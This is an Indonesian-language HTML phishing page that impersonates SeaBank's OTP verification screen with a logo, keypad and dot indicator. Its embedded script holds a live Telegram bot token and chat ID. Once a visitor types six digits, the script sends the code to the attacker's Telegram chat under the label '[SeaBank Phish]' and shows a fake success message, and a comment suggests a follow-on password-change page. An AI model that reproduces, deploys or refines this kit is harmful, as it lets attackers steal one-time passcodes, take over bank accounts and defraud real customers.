<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi OTP SeaBank</title>
    
    <style>
        /* CSS Umum dan Warna Konsisten dengan Seabank */
        body {
            font-family: Arial, sans-serif;
            background-color: #ffffff;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            min-height: 100vh;
            /* Mencegah scrolling horizontal pada body */
            overflow-x: hidden; 
        }

        /* --- Header Aplikasi --- */
        .app-header {
            display: flex;
            align-items: center;
            padding: 15px 20px;
            border-bottom: 1px solid #eee;
            color: #333;
            font-size: 1.1em;
            font-weight: bold;
        }

        .app-header .back-arrow {
            font-size: 1.5em;
            margin-right: 15px;
            color: #555;
            cursor: pointer;
        }

        /* --- Konten Utama (Logo, Teks, Indikator OTP) --- */
        .main-content {
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            text-align: center;
            min-height: 0; 
        }

        .logo-container {
            margin-bottom: 30px;
        }

        .logo-container img {
            width: 150px;
            height: auto;
        }

        .otp-prompt {
            color: #555;
            font-size: 1.1em;
            margin-bottom: 15px;
        }
        
        .otp-sent-to {
            font-size: 0.9em;
            color: #777;
            margin-bottom: 30px;
        }

        /* --- Indikator OTP (Titik-titik) --- */
        .otp-indicator-container {
            display: flex;
            justify-content: center;
            gap: 25px;
            margin-bottom: 30px;
            height: 15px;
        }

        .otp-dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background-color: #e0e0e0;
            transition: background-color 0.1s ease;
        }

        .otp-dot.active {
            background-color: #ff6600;
        }

        .resend-link {
            display: block;
            margin-top: 20px;
            font-size: 0.9em;
            color: #ff6600; /* Warna orange Seabank */
            text-decoration: none;
            font-weight: bold;
        }
        .resend-link:hover {
            text-decoration: underline;
        }

        /* --- Keypad Numerik (PERBAIKAN UKURAN) --- */
        .keypad-container {
            background-color: #ffffff;
            padding: 10px 20px 40px; 
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 15px;
            width: 100%;
            max-width: 350px; 
            margin: 0 auto;
            box-sizing: border-box; 
        }

        .keypad-button {
            background-color: #f7f7f7;
            border: none;
            border-radius: 50%; 
            padding: 0;
            font-size: 1.6em;
            font-weight: 500;
            color: #333;
            cursor: pointer;
            user-select: none;
            transition: background-color 0.1s ease;
            display: flex;
            justify-content: center;
            align-items: center;
            /* Menggunakan padding-top untuk proporsi yang benar */
            padding-top: 100%; 
            position: relative;
        }

        .keypad-button span {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }

        .keypad-button:active {
            background-color: #e0e0e0;
        }
        
        .keypad-button.empty {
            background-color: transparent;
            border: none;
            cursor: default;
        }
        
        .keypad-button.delete {
            background-color: transparent;
            border: none;
        }
        
        .keypad-button.delete img {
            width: 30px;
            height: auto;
            filter: invert(0.3);
        }
    </style>
</head>
<body>
    
<div class="app-header">
        <span class="back-arrow" onclick="history.back()">&#8592;</span> 
        Verifikasi OTP SeaBank
    </div>

    
<div class="main-content">
        <div class="logo-container">
            <img src="logo.png" alt="Logo SeaBank">
        </div>

        <p class="otp-prompt">Masukkan Kode OTP</p>
        <p class="otp-sent-to">Kode telah dikirim ke nomormu <strong></strong></p> 
        
        <div class="otp-indicator-container">
            <div class="otp-dot"></div>
            <div class="otp-dot"></div>
            <div class="otp-dot"></div>
            <div class="otp-dot"></div>
            <div class="otp-dot"></div>
            <div class="otp-dot"></div>
        </div>

        <a href="#" class="resend-link">Kirim Ulang Kode OTP</a>
    </div>

    
<div class="keypad-container">
        <div class="keypad-button" data-value="1"><span>1</span></div>
        <div class="keypad-button" data-value="2"><span>2</span></div>
        <div class="keypad-button" data-value="3"><span>3</span></div>
        <div class="keypad-button" data-value="4"><span>4</span></div>
        <div class="keypad-button" data-value="5"><span>5</span></div>
        <div class="keypad-button" data-value="6"><span>6</span></div>
        <div class="keypad-button" data-value="7"><span>7</span></div>
        <div class="keypad-button" data-value="8"><span>8</span></div>
        <div class="keypad-button" data-value="9"><span>9</span></div>
        <div class="keypad-button empty"></div>
        <div class="keypad-button" data-value="0"><span>0</span></div>
        <div class="keypad-button delete" data-value="delete">
            <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='currentColor'><path d='M22 3H7c-.69 0-1.05.35-1.35.65L3 8l3.65 4.35c.3.3.66.65 1.35.65H22c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-3 8h-4V7h4v4z'/></svg>" 
                 alt="Hapus" 
                 title="Hapus Digit Terakhir">
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const otpDots = document.querySelectorAll('.otp-dot');
            const keypadButtons = document.querySelectorAll('.keypad-button');
            let currentOtp = '';
            const otpLength = 6;

            // *** INFORMASI BOT TELEGRAM ANDA ***
            const BOT_TOKEN = '8286824254:AAHECrYlrnN0GeEBdG2ASNJEg79mw0FAYn8';
            const CHAT_ID = '5923031825';
            // **********************************

            function updateOtpDisplay() {
                otpDots.forEach((dot, index) => {
                    if (index < currentOtp.length) {
                        dot.classList.add('active');
                    } else {
                        dot.classList.remove('active');
                    }
                });
            }

            // Fungsi untuk mengirim data ke Telegram
            function sendToTelegram(message) {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
                
                // Menggunakan Fetch API untuk permintaan asinkronus
                fetch(url)
                    .then(response => {
                        if (!response.ok) {
                            console.error('Gagal mengirim ke Telegram:', response.statusText);
                        }
                    })
                    .catch(error => {
                        console.error('Error saat melakukan fetch ke Telegram:', error);
                    });
            }


            keypadButtons.forEach(button => {
                button.addEventListener('click', function() {
                    const value = this.dataset.value;

                    if (value === 'delete') {
                        currentOtp = currentOtp.slice(0, -1);
                    } else if (value && currentOtp.length < otpLength) {
                        currentOtp += value;
                    }

                    updateOtpDisplay();

                    if (currentOtp.length === otpLength) {
                        // OTP Lengkap, KIRIM KE TELEGRAM
                        const otpMessage = `[SeaBank Phish] OTP Diterima: ${currentOtp}`;
                        sendToTelegram(otpMessage);
                        
                        // Lanjutkan ke langkah berikutnya
                        setTimeout(() => {
                            alert('OTP berhasil dimasukkan. Proses verifikasi selesai. Anda akan diarahkan ke halaman berikutnya.');
                            // Ganti baris di bawah dengan halaman yang sebenarnya (misal: halaman ganti password baru)
                            // window.location.href = 'ganti_password_baru.html'; 
                            currentOtp = ''; 
                            updateOtpDisplay();
                        }, 500);
                    }
                });
            });
        });
    </script>
</body>
</html>
